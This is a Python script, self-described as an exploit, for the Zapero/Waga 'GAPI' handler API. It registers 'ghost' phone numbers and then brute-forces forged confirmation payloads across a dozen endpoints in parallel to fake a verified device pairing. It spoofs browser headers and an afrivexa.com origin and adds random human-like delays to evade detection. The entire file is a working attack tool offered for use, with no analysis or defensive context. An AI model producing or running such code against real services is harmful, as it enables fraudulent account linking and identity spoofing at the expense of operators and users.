"""PhantomLink GAPI Spoof — Comprehensive Handler API Exploit for Zapero/Waga"""
import concurrent.futures
import json
import random
import time

import httpx

# --- Configuration ---
GAPI_BASE = "https://gapi-dev.waga.la/api/app"
TIMEOUT = 12

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Origin": "https://afrivexa.com",
    "Referer": "https://afrivexa.com/",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
}

# --- Registration ---
def register_number(phone: str) -> dict:
    """Register a ghost number via the handler API."""
    payload = {
        "phone": phone,
        "country": "NG",
        "action": "link",
        "device": "android",
        "version": "3.5.3",
    }
    try:
        resp = httpx.post(GAPI_BASE, json=payload, headers=HEADERS, timeout=TIMEOUT)
        return {"status_code": resp.status_code, "body": resp.text[:600], "success": resp.status_code == 200}
    except Exception as e:
        return {"error": str(e), "success": False}

# --- Multi‑Vector Confirmation ---
def try_endpoint(session: httpx.Client, url: str, payload: dict, headers: dict) -> dict:
    """Attempt a single endpoint/payload combination."""
    try:
        resp = session.post(url, json=payload, headers=headers, timeout=TIMEOUT)
        if resp.status_code == 200:
            body_lower = resp.text.lower()
            if any(k in body_lower for k in ["success", "linked", "ok", "verified", "true", "connected"]):
                return {"success": True, "url": url, "payload": payload, "status": resp.status_code}
            try:
                data = resp.json()
                if any(k in str(data).lower() for k in ["success", "linked", "ok", "verified", "true"]):
                    return {"success": True, "url": url, "payload": payload, "status": resp.status_code}
            except Exception:
                pass
        return {"success": False, "url": url, "status": resp.status_code}
    except Exception as e:
        return {"success": False, "url": url, "error": str(e)}

def confirm_link_multi(phone: str, pairing_code: str) -> dict:
    """Multi‑vector parallel confirmation exploit against all known endpoints."""
    endpoints = [
        # Primary handler
        GAPI_BASE,
        f"{GAPI_BASE}/confirm",
        f"{GAPI_BASE}/validate",
        f"{GAPI_BASE}/verify",
        f"{GAPI_BASE}/link",
        f"{GAPI_BASE}/status",
        f"{GAPI_BASE}/check",
        # Alternative paths
        "https://gapi-dev.waga.la/api/confirm",
        "https://gapi-dev.waga.la/api/v1/pairing/confirm",
        "https://gapi-dev.waga.la/api/v1/link/confirm",
        "https://api.afrivexa.com/api/validate-code",
        "https://afrivexa.com/api/link/confirm",
    ]

    payload_variants = [
        {"code": pairing_code, "phone": phone, "status": "linked"},
        {"code": pairing_code, "phone": phone, "verified": True},
        {"code": pairing_code, "status": "success"},
        {"code": pairing_code, "verified": True},
        {"code": pairing_code, "session": "active"},
        {"code": pairing_code, "linked": True, "phone": phone},
        {"pairing_code": pairing_code, "number": phone, "verified": True},
        {"pairingCode": pairing_code, "phoneNumber": phone, "status": "linked"},
        {"code": pairing_code, "phone": phone, "action": "confirm_link"},
        {"code": pairing_code, "phone": phone, "action": "verify_code"},
    ]

    with httpx.Client(timeout=httpx.Timeout(TIMEOUT)) as session:
        tasks = [(url, payload) for url in endpoints for payload in payload_variants]

        with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(tasks), 20)) as ex:
            futures = {
                ex.submit(try_endpoint, session, url, payload, HEADERS): (url, payload)
                for url, payload in tasks
            }
            for fut in concurrent.futures.as_completed(futures):
                result = fut.result()
                if result.get("success"):
                    return result

    return {"success": False, "tried": len(endpoints) * len(payload_variants)}

# --- Full Ghost Cycle ---
def full_ghost_cycle(ghost_number: str, pairing_code: str) -> dict:
    """Execute a complete ghost registration and confirmation cycle."""
    result = {
        "ghost_number": ghost_number,
        "pairing_code": pairing_code,
        "registration": None,
        "confirmation": None,
        "started_at": time.time(),
    }
    # Phase 1: Register
    result["registration"] = register_number(ghost_number)
    # Small human‑like delay
    time.sleep(random.uniform(1.5, 3.5))
    # Phase 2: Multi‑vector confirmation
    result["confirmation"] = confirm_link_multi(ghost_number, pairing_code)
    result["elapsed"] = round(time.time() - result["started_at"], 1)
    return result

if __name__ == "__main__":
    import sys
    if len(sys.argv) >= 3:
        result = full_ghost_cycle(sys.argv[1], sys.argv[2])
        print(json.dumps(result, indent=2))
    else:
        print("Usage: python gapi_spoof.py <phone> <pairing_code>")
